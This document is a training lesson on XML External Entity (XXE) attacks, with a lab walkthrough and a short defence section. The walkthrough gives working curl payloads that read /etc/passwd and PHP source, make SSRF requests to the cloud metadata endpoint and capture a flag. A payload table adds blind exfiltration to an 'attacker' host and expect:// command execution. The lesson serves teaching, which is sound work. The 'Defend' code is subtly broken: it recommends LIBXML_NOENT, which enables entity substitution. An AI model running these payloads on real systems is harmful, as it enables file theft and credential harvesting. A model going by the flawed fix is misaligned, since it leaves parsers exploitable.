# XXE — XML External Entity

> **Difficulty:** Medium — **Level:** intermediate

## Introduction

XML has the concept of **ENTITIES** — "variables/entities" you declare and reuse inside a document. **XXE (XML External Entity)** happens when an app **parses user-controlled XML** while allowing entities to reference **external sources** (files on the server, URLs). Impact: **read sensitive files** (`/etc/passwd`, source code), **SSRF** (send requests into internal networks), even **RCE** with PHP `expect://`. It falls under **A05 Security Misconfiguration**.

---

## Part A — Understand

### Entities in XML

```xml
<!DOCTYPE foo [
  <!ENTITY name "value">
]>
<root>&name;</root>   <!-- this will print "value" -->
```

Declare an **external entity** with `SYSTEM` to reference a file/URL:

```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>     <!-- will contain the content of /etc/passwd -->
```

### How the app gets vulnerable

```php
// VULNERABLE: parse XML with DTD/entities enabled
$xml = $_POST['xml'];
$data = simplexml_load_string($xml);   // PHP < 8: external entities still run
echo (string)$data->name;
```

- Before PHP 8, `libxml_disable_entity_loader` defaults to `false` → external entities run.
- PHP 8+ blocks them by default. But apps using **libxml2 C / Java / Python lxml** are still vulnerable to XXE.

### Basic XXE payloads

| Goal | Payload |
|------|---------|
| Read a file | `<!ENTITY xxe SYSTEM "file:///etc/passwd">` |
| Read a file with special chars | Use `php://filter/convert.base64-encode` |
| SSRF | `<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">` |
| Blind XXE (exfil over HTTP) | `<!ENTITY xxe SYSTEM "http://attacker/<?file...?>">` |
| RCE (PHP, if enabled) | `<!ENTITY xxe SYSTEM "expect://id">` |

> **Intuition:** The app parses XML and "trusts" everything in it. You declare an entity pointing outside (`SYSTEM "file://..."`). When the app meets `&xxe;`, it automatically reads that file and embeds it into the result. The app has no idea it's doing it for you.

---

## Part B — Exploit: XXE Lab

### Step 1: Start the lab

```bash
cd xxe/lab
docker compose up -d

> 💡 **Get Lab Link:** Open this lesson on **Learning Detail** → click **"Access Lab"** to get the real link (e.g., `https://vuln.ghedahaui.online/labs-env/...`). Replace `<LAB_ADDRESS>` with that link in commands below.

# Lab at: <LAB_ADDRESS>
```

The lab is an API that accepts XML (like a "product" or "search" app) via `POST /api/parse`, parses it and returns the `name` field.

<!-- IMG: XXE lab page with XML input form (step 1). File: xxe_01_form.png -->

### Step 2: Send normal XML

```bash
$ curl -s <LAB_ADDRESS>/api/parse -X POST \
       -H "Content-Type: application/xml" \
       -d '<product><name>Laptop</name><price>999</price></product>'
{"name":"Laptop"}
```

<!-- IMG: Parsing normal XML returning the name (step 2). File: xxe_02_normal.png -->

> **Explain:** The app receives XML, parses it, grabs the `name` field and returns JSON. Since the app uses XML → a viable XXE target.

### Step 3: XXE read /etc/passwd

```bash
$ curl -s <LAB_ADDRESS>/api/parse -X POST \
       -H "Content-Type: application/xml" \
       -d '<?xml version="1.0"?>
           <!DOCTYPE product [
             <!ENTITY xxe SYSTEM "file:///etc/passwd">
           ]>
           <product><name>&xxe;</name></product>'
{"name":"root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
..."}
```

<!-- IMG: XXE reading /etc/passwd successfully (step 3). File: xxe_03_etc_passwd.png -->

> **Explain:** `<!ENTITY xxe SYSTEM "file:///etc/passwd">` declares an entity `xxe` pointing at the file. When the app parses and meets `&xxe;`, it substitutes the content of `/etc/passwd`. The vulnerability is that the app allows DTD/external entities without blocking them.

### Step 4: Read a file with special chars (php://filter)

```bash
$ curl -s <LAB_ADDRESS>/api/parse -X POST \
       -H "Content-Type: application/xml" \
       -d '<?xml version="1.0"?>
           <!DOCTYPE product [
             <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">
           ]>
           <product><name>&xxe;</name></product>'
{"name":"PD9waHAgLy8gQVBJIHBhcnNl..."}
```

<!-- IMG: php://filter reading index.php source as base64 (step 4). File: xxe_04_php_filter.png -->

```bash
$ echo "PD9waHAgLy8gQVBJIHBhcnNl..." | base64 -d
```

> **Explain:** PHP files contain `<`, `>` which would break the XML if inserted directly. `php://filter/convert.base64-encode` encodes the content as base64 (a safe string) → you read the source without breaking XML.

### Step 5: SSRF — call the cloud metadata endpoint

```bash
$ curl -s <LAB_ADDRESS>/api/parse -X POST \
       -H "Content-Type: application/xml" \
       -d '<?xml version="1.0"?>
           <!DOCTYPE product [
             <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
           ]>
           <product><name>&xxe;</name></product>'
{"name":"<HTML>...</HTML>"}
```

<!-- IMG: SSRF calling the cloud metadata service (step 5). File: xxe_05_ssrf.png -->

> **Explain:** `169.254.169.254` is the **cloud metadata service** (reachable only internally). The app server is abused as a "proxy" to call it — that's **SSRF**. In the real world you could harvest IAM credentials of the instance.

### Step 6: Read the flag via XXE

```bash
$ curl -s <LAB_ADDRESS>/api/parse -X POST \
       -H "Content-Type: application/xml" \
       -d '<?xml version="1.0"?>
           <!DOCTYPE product [
             <!ENTITY xxe SYSTEM "file:///flag.txt">
           ]>
           <product><name>&xxe;</name></product>'
{"name":"FLAG{xx3_3xt3rn4l_2026}"}
```

<!-- IMG: Reading /flag.txt via XXE (step 6). File: xxe_06_flag.png -->

> **Explain:** Same as step 3 but reading `/flag.txt`. That's the lab flag. Note: if the flag contained XML special chars (`<`...), use the `php://filter` base64 trick from step 4.

---

## Part C — Defend

### Fixes

1. **Disable DTD / external entities** when parsing:

```php
// PHP 8+: libxml_disable_entity_loader was removed → use libxml options
libxml_use_internal_errors(true);
$options = LIBXML_NONET | LIBXML_NOENT;  // NOENT still loads internal entities
// Use only LIBXML_NONET (blocks network). Better: block external entities entirely.
```

```xml
<!-- Or use a parser without DTD support (e.g. expat) -->
```

2. **Don't parse XML unless you must** — use JSON.
3. **Don't show parser errors** to the user.
4. **Validate input**: if XML is accepted, check against a schema (no DTD).

### Quick test checklist

```text
[ ] Entity file:///etc/passwd → content shown?
[ ] file:///flag.txt
[ ] php://filter/convert.base64-encode/resource=index.php
[ ] SSRF: http://127.0.0.1:PORT, http://169.254.169.254/...
[ ] Blind XXE: external DTD sending data back to an attacker server
[ ] Try content-types: application/xml, text/xml, application/x-xml
[ ] Test both GET (if the app parses a query) and POST
```

---

